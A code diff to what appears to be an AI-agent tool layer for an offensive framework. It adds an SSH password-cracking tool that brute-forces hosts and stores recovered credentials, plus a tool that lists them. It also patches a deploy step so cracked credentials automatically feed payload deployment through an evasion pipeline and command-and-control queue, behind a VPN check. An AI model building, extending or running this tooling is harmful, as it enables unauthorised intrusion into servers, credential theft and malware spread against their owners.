@@ -307,6 +307,50 @@ _TOOL_SPECS: list[dict[str, Any]] = [
             },
         },
     },
+    {
+        "name": "crack_ssh",
+        "description": "Online SSH password cracking against one or more hosts. Persists recovered credentials to the store for later deploy runs.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "hosts": {
+                    "type": "string",
+                    "description": "Comma-separated ip[:port] hosts to crack, e.g. 10.0.0.5,10.0.0.6:2222.",
+                },
+                "target_label": {
+                    "type": "string",
+                    "description": "Pull hosts from the store by final label instead of passing hosts.",
+                },
+                "min_confidence": {"type": "number"},
+                "limit": {"type": "integer"},
+                "users": {
+                    "type": "string",
+                    "description": "Comma-separated usernames to try (default: built-in population).",
+                },
+                "user": {"type": "string"},
+                "wordlist": {"type": "string"},
+                "passwords": {"type": "string"},
+                "no_mutations": {"type": "boolean"},
+                "concurrency": {"type": "integer"},
+                "max_attempts": {"type": "integer"},
+                "timeout": {"type": "number"},
+                "skip_vpn_check": {"type": "boolean"},
+            },
+            "required": ["hosts"],
+        },
+    },
+    {
+        "name": "list_credentials",
+        "description": "List cracked SSH credentials stored by crack_ssh.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "ip": {"type": "string"},
+                "user": {"type": "string"},
+                "limit": {"type": "integer"},
+            },
+        },
+    },
 ]
 
 
@@ -479,6 +523,20 @@ def _tool_deploy(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
     if not targets:
         return {"error": "no targets matched"}
 
+    # Auto-fill cracked credentials from the store so a chat-driven "crack
+    # then deploy" loop needs no extra args. Explicit user/key still win.
+    if not args.get("ssh_user") and not args.get("ssh_key"):
+        for target in targets:
+            if target.ssh_user and target.ssh_pass:
+                continue
+            cred = ctx.store.credential_for(target.ip, target.port)
+            if not cred:
+                continue
+            if not target.ssh_user:
+                target.ssh_user = cred.get("user")
+            if not target.ssh_pass:
+                target.ssh_pass = cred.get("password")
+
     evasion = prepare_evasion_pipeline(args.get("evasion"))
     manifest = build_manifest(payload_id, targets, variables, evasion)
     op = enqueue_operation(ctx.c2_store, manifest)
@@ -577,6 +635,95 @@ def _tool_set_ollama(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
     }
 
 
+def _tool_crack_ssh(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
+    skip = bool(args.get("skip_vpn_check", ctx.skip_vpn_check))
+    if not skip and not _require_vpn(ctx):
+        return {"error": "VPN gate blocked the crack run. Connect Mullvad or pass skip_vpn_check=true."}
+
+    from honeywatch.cli import parse_host
+    from honeywatch.crack import CrackTarget, crack_targets, load_wordlist
+
+    cfg = load_config()
+    crack_cfg = getattr(cfg, "crack", None)
+    concurrency = int(args.get("concurrency") or getattr(crack_cfg, "concurrency", 8))
+    timeout_s = float(args.get("timeout") or getattr(crack_cfg, "timeout_s", 6.0))
+    max_attempts = args.get("max_attempts")
+    if max_attempts is not None:
+        max_attempts = int(max_attempts)
+    else:
+        max_attempts = getattr(crack_cfg, "max_attempts", None)
+    mutations = (not bool(args.get("no_mutations", False))) and bool(getattr(crack_cfg, "mutations", True))
+
+    users: list[str] = []
+    if args.get("user"):
+        users = [args["user"]]
+    elif args.get("users"):
+        users = [u.strip() for u in args["users"].split(",") if u.strip()]
+
+    passwords: list[str] = []
+    if args.get("passwords"):
+        passwords = [p.strip() for p in args["passwords"].split(",") if p.strip()]
+
+    wordlist: list[str] | None = None
+    if args.get("wordlist"):
+        wordlist = load_wordlist(args["wordlist"])
+
+    hosts: list[tuple[str, int]] = []
+    raw = args.get("hosts") or ""
+    for spec in raw.split(","):
+        spec = spec.strip()
+        if spec:
+            ip, port = parse_host(spec)
+            hosts.append((ip, port))
+
+    if not hosts and (args.get("target_label") or args.get("min_confidence") is not None):
+        rows = ctx.store.query(
+            limit=int(args.get("limit") or 1000),
+            label=args.get("target_label"),
+            min_confidence=float(args.get("min_confidence") or 0.0),
+        )
+        for row in rows:
+            hosts.append((row["ip"], int(row["port"])))
+
+    if not hosts:
+        return {"error": "no targets. Pass hosts=... or target_label/min_confidence."}
+
+    targets = [
+        CrackTarget(
+            ip=ip, port=port, users=users, passwords=passwords,
+            wordlist=wordlist, mutations=mutations,
+            max_attempts=max_attempts, timeout_s=timeout_s,
+        )
+        for ip, port in hosts
+    ]
+
+    results = asyncio.run(crack_targets(targets, concurrency=concurrency))
+
+    for res in results:
+        if res.success:
+            ctx.store.upsert_credential(
+                res.ip, res.port, res.user or "", res.password,
+                banner=res.banner, attempts=res.attempts, source="crack",
+            )
+
+    wins = [r.credential() for r in results if r.success]
+    return {
+        "hosts": len(results),
+        "successes": len(wins),
+        "attempts": sum(r.attempts for r in results),
+        "credentials": wins,
+        "results": [r.credential() for r in results],
+    }
+
+
+def _tool_list_credentials(args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
+    rows = ctx.store.query_credentials(
+        ip=args.get("ip"), user=args.get("user"),
+        limit=int(args.get("limit", 100)),
+    )
+    return {"count": len(rows), "credentials": rows}
+
+
 def _summarize_scores(scores: list[Score]) -> dict[str, int]:
     from collections import Counter
 
@@ -614,6 +761,8 @@ _tool("get_operations", _tool_get_operations)
 _tool("get_tasks", _tool_get_tasks)
 _tool("set_wallet", _tool_set_wallet)
 _tool("set_ollama", _tool_set_ollama)
+_tool("crack_ssh", _tool_crack_ssh)
+_tool("list_credentials", _tool_list_credentials)
 
 
 def execute_tool(name: str, args: dict[str, Any], ctx: ToolContext) -> dict[str, Any]:
